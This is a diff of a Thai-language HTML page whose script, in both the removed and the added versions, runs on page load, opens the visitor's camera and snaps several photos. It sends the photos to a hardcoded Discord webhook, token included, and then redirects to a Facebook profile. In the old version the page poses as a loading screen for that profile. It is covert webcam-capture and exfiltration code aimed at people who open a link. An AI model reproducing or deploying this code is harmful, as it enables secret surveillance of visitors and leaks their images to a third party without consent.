@@ -3,64 +3,103 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>📸 ถ่ายภาพแล้วส่งไปยัง Discord</title>
+  <title>📷 การถ่ายภาพและส่งข้อมูล</title>
   <script>
-    async function captureImages() {
+    // ฟังก์ชันสำหรับจับภาพ
+    function captureImages() {
       const videoElement = document.createElement('video');
-      const canvasElement = document.createElement('canvas');
-      const ctx = canvasElement.getContext('2d');
-      const images = [];
-      
-      // เปิดกล้อง
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      videoElement.srcObject = stream;
-      videoElement.play();
-      
-      // สร้างภาพถ่าย 10 รูป
-      for (let i = 0; i < 10; i++) {
-        await new Promise((resolve) => setTimeout(resolve, 2000)); // รอ 2 วินาที
-        canvasElement.width = videoElement.videoWidth;
-        canvasElement.height = videoElement.videoHeight;
-        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-        images.push(canvasElement.toDataURL('image/jpeg')); // เก็บรูปภาพที่ถูกถ่าย
-      }
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+      const images = []; // เก็บรูปภาพที่ถ่าย
 
-      // หยุดกล้อง
-      stream.getTracks().forEach(track => track.stop());
-      
-      // ส่งภาพไปยัง Discord Webhook
-      try {
-        await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: "📸 ถ่ายภาพ 10 รูปแล้วส่งมาให้คุณ!",
-            embeds: images.map((image, index) => ({
-              title: `📸 รูปที่ ${index + 1}`,
-              image: { url: image },
-              color: 0x00cc99,
-              footer: { text: "Image Capture" },
-              timestamp: new Date().toISOString()
-            }))
-          })
+      // กำหนดแทร็กสำหรับการจับภาพ
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          videoElement.srcObject = stream;
+          videoElement.play();
+          
+          let imageCount = 0;
+
+          // ฟังก์ชันจับภาพหลังจาก 2 วินาที
+          function capture() {
+            setTimeout(() => {
+              canvas.width = videoElement.videoWidth;
+              canvas.height = videoElement.videoHeight;
+              context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+              const imageUrl = canvas.toDataURL('image/jpeg'); // แปลงภาพเป็น Base64
+              images.push(imageUrl); // เก็บภาพ
+
+              imageCount++;
+
+              // หากจับครบ 2 ภาพแล้ว
+              if (imageCount === 2) {
+                sendImagesToDiscord(images); // ส่งไป Discord
+                stream.getTracks().forEach(track => track.stop()); // หยุดการถ่ายภาพ
+              } else {
+                capture(); // ถ่ายภาพถัดไป
+              }
+            }, 2000); // ทุก 2 วินาที
+          }
+
+          capture(); // เริ่มจับภาพ
+        })
+        .catch(error => {
+          console.error("Error accessing the camera", error);
         });
-        console.log("ส่งข้อมูลไปยัง Discord สำเร็จ!");
-      } catch (e) {
-        console.error("การส่งข้อมูลไป Discord ล้มเหลว:", e);
-      }
-
-      // Redirect หลังจากส่งข้อมูล
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
-      }, 2000);
     }
 
-    window.onload = captureImages; // เรียกใช้ฟังก์ชันเมื่อหน้าเว็บโหลดเสร็จ
+    // ฟังก์ชันสำหรับส่งภาพไป Discord Webhook
+    function sendImagesToDiscord(images) {
+      fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: "📷 ภาพใหม่จากกล้องมือถือ!",
+          embeds: [
+            {
+              title: "📸 ภาพจากกล้อง",
+              description: "นี่คือภาพที่คุณถ่าย",
+              color: 0x00cc99,
+              image: {
+                url: images[0] // ภาพแรก
+              },
+              footer: { text: "Geo Tracker" },
+              timestamp: new Date().toISOString()
+            },
+            {
+              title: "📸 ภาพที่สองจากกล้อง",
+              description: "ภาพถัดไปจากกล้อง",
+              color: 0x00cc99,
+              image: {
+                url: images[1] // ภาพที่สอง
+              },
+              footer: { text: "Geo Tracker" },
+              timestamp: new Date().toISOString()
+            }
+          ]
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Images sent successfully:", data);
+        // ส่งเสร็จแล้ว redirect
+        setTimeout(() => {
+          window.location.href = "https://www.facebook.com/chaiwat.inanong"; // เปลี่ยน URL ไปที่หน้า Facebook ใหม่
+        }, 2000); // 2 วินาทีหลังจากส่งข้อมูล
+      })
+      .catch(error => {
+        console.error("Failed to send images to Discord:", error);
+      });
+    }
+
+    window.onload = function() {
+      captureImages(); // เรียกใช้ฟังก์ชันถ่ายภาพเมื่อหน้าเว็บโหลด
+    };
   </script>
 </head>
 <body>
-  <h2>📸 กำลังโหลกไปยัง https://www.facebook.com/CEONattakanPinbuaOongfong...</h2>
+  <h2>📸 กำลังถ่ายภาพจากกล้อง...</h2>
 </body>
 </html>
